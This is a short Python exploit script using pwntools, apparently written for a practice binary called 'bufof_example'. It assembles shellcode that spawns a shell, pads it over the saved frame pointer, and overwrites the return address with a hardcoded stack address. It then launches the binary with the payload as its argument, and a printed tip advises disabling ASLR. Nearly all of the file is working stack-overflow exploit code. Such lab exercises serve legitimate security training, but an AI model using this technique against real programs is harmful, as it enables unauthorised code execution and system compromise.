import os
import subprocess
import pwn

pwn.context.clear()
pwn.context.update(arch = 'amd64', os = 'linux')

target_info = {
	'exec_path': './bufof_example',
	'addr_len': 0x8,
	'buf2stack': 0x70,
	'shellcode_len': 0x0,
	'buf_addr': 0x0,
	'cmdline': '',
}

'''
| buffer               | caller rbp | callee return             |
| shellcode | paddding | padding    | shellcode site (rbp-0x70) |
| rbp-0x70  | rbp-0x30 | rbp+0x0    | rbp+0x8                   |
'''

pwn.context.binary = pwn.ELF(target_info['exec_path'])

shellcode_src = pwn.shellcraft.sh()
shellcode_raw_bytes = pwn.asm(shellcode_src)
target_info['shellcode_len'] = len(shellcode_raw_bytes)

print('[--] tips: may need to disable ASLR, and update new rbp')
target_info['buf_addr'] = 0x7fffffffde50
hijack_ret = pwn.p64(target_info['buf_addr'])

payload_raw = shellcode_raw_bytes
payload_raw += b'A' * (target_info['buf2stack'] - target_info['shellcode_len'])
payload_raw += b'B' * target_info['addr_len']
payload_raw += hijack_ret

with open('./payload.txt', 'wb') as f:
    f.write(payload_raw)

target_info['cmdline'] = target_info['exec_path'] + ' ' + '$(cat ./payload.txt)'
ret = os.system(target_info['cmdline'])
os.remove('./payload.txt')
print('[++] receive: return code = {0}'.format(ret))
